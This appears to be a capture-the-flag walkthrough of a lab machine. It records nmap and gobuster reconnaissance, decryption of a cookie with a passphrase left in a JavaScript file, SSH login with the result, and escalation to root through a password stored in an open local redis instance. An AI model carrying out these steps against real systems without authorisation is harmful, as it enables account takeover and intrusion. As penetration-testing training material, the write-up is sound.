# ReconCipher - ThunderCipher





Target Ip. Address : 192.168.5.250



So, Let's start by nmap scan.



```bash

nmap -sV -sC 192.168.5.250

Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-04 08:16 +0545

Nmap scan report for 192.168.5.250

Host is up (0.078s latency).

Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

| ssh-hostkey: 

|   2048 5c:8e:2c:cc:c1:b0:3e:7c:0e:22:34:d8:60:31:4e:62 (RSA)

|   256 81:fd:c6:4c:5a:50:0a:27:ea:83:38:64:b9:8b:bd:c1 (ECDSA)

|\_  256 c1:8f:87:c1:52:09:27:60:5f:2e:2d:e0:08:03:72:c8 (ED25519)

80/tcp open  http    Apache httpd 2.4.38 ((Debian))

|\_http-server-header: Apache/2.4.38 (Debian)

|\_http-title: ReconCipher | Index 

Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel



Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 16.25 seconds

````



So, only port 22(ssh) and 80(http) ports are open.

Let's head to the website on port 80, and see what it has for us.



The website contains some images of statues but no specific hints and all.

So, let's use gobuster to see if we find and hidden directories.





```bash

gobuster dir -u http://192.168.5.250 -w /usr/share/wordlists/dirb/big.txt 

===============================================================

Gobuster v3.8.2

by OJ Reeves (@TheColonial) \& Christian Mehlmauer (@firefart)

===============================================================

\[+] Url:                     http://192.168.5.250

\[+] Method:                  GET

\[+] Threads:                 10

\[+] Wordlist:                /usr/share/wordlists/dirb/big.txt

\[+] Negative Status codes:   404

\[+] User Agent:              gobuster/3.8.2

\[+] Timeout:                 10s

===============================================================

Starting gobuster in directory enumeration mode

===============================================================

.htpasswd            (Status: 403) \[Size: 278]

.htaccess            (Status: 403) \[Size: 278]

css                  (Status: 301) \[Size: 312] \[--> http://192.168.5.250/css/]

img                  (Status: 301) \[Size: 312] \[--> http://192.168.5.250/img/]

js                   (Status: 301) \[Size: 311] \[--> http://192.168.5.250/js/]

manual               (Status: 301) \[Size: 315] \[--> http://192.168.5.250/manual/]

server-status        (Status: 403) \[Size: 278]

Progress: 20469 / 20469 (100.00%)

===============================================================             

Finished                                                                    

===============================================================  

```





I though that manual was something that could help me but it was of no use. It was just a default Apache Server manual.



And, surprisingly unders the js directory, there was main.js which was holding the secret all along.







```main.js

function viewDetails(str) {



&nbsp; window.location.href = "opus-details.php?id="+str;

}



/\*

var CryptoJS = require("crypto-js");

var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");

console.log(decrypted.toString(CryptoJS.enc.Utf8));

\*/

```





So, it has some cryptographic functions with a secret key and a custom directory as well.



I went to directory and tried different strings as an input, and it basically just echoed it back to me. I was kind of getting lost in it.



Then, at the local storage our cookie was a long string, after some research I found that string was indeed our encrypted text.





```encrypted\_string

U2Fs.....BSZt

```





Since, we have a key and a encrypted\_Text, let's decrypt it and see what it has for us.





```bash

echo "U2Fs....BSZt" | openssl enc -d -aes-256-cbc -a -salt -pass pass:SecretPassphraseMomentum -md md5

\*\*\* WARNING : deprecated key derivation used.

Using -iter or -pbkdf2 would be better.

auxerre-.....um##

```



Well, it dropped us some hint, I was getting kind of lost here. I noticed it was something like a name, so I tried if it is a ssh user.





I checked if it is a valid user, and yes, the user is a valid user and has password and publickey enabled for login.





```bash

ssh auxerre@192.168.5.250

\*\* WARNING: connection is not using a post-quantum key exchange algorithm.

\*\* This session may be vulnerable to "store now, decrypt later" attacks.

\*\* The server may need to be upgraded. See https://openssh.com/pq.html

auxerre@192.168.5.250's password: 

Permission denied, please try again.

auxerre@192.168.5.250's password: 

Permission denied, please try again.

auxerre@192.168.5.250's password: 

auxerre@192.168.5.250: Permission denied (publickey,password).

```



Since, the decrypted message had a ssh username and some text, I tried different combinations, but later I found out that entire decrypted mesaage was a password.



```bash

ssh auxerre@192.168.5.250

\*\* WARNING: connection is not using a post-quantum key exchange algorithm.

\*\* This session may be vulnerable to "store now, decrypt later" attacks.

\*\* The server may need to be upgraded. See https://openssh.com/pq.html

auxerre@192.168.5.250's password: 

Linux Momentum 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86\_64



The programs included with the Debian GNU/Linux system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/\*/copyright.



Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent

permitted by applicable law.

Last login: Thu Apr 22 08:47:31 2021

auxerre@Momentum:~$ 

```



We find our first flag at the home directory.



```bash

auxerre@Momentum:~$ cat user.txt

ThunderCipher{rec.....her}

```



Again lost, we have no sudo, no SUID, no cronjobs, etc. which are some classic privilege escalation vectors.



Running linpeas, pspy64, etc. tools also lead me nowhere.



I at least found that, redis server is running at port 6379, at least I got something.



``bash

auxerre@Momentum:~$ ss -tulnp

Netid                      State                       Recv-Q                      Send-Q                                             Local Address:Port                                             Peer Address:Port                      

udp                        UNCONN                      0                           0                                                        0.0.0.0:68                                                    0.0.0.0:\*                         

tcp                        LISTEN                      0                           128                                                      0.0.0.0:22                                                    0.0.0.0:\*                         

tcp                        LISTEN                      0                           128                                                    127.0.0.1:6379                                                  0.0.0.0:\*                         

tcp                        LISTEN                      0                           128                                                         \[::]:22                                                       \[::]:\*                         

tcp                        LISTEN                      0                           128                                                        \[::1]:6379                                                     \[::]:\*                         

tcp                        LISTEN                      0                           128                                                            \*:80                                                          \*:\*  

```





We got our root password from redis.



```bash

auxerre@Momentum:~$ redis-cli

127.0.0.1:6379> KEYS \*

1\) "rootpass"

127.0.0.1:6379> GET rootpass

"m0.....um##"

127.0.0.1:6379> 

```





Now, let's see if this is a correct password.



```bash

auxerre@Momentum:~$ su root

Password: 

root@Momentum:/home/auxerre# 

```





This was indeed a correct password for root. Now, let's go to root directory, read the final flag and end this challenge.



```bash

root@Momentum:~# cat root.txt

ThunderCipher{root....h}

```

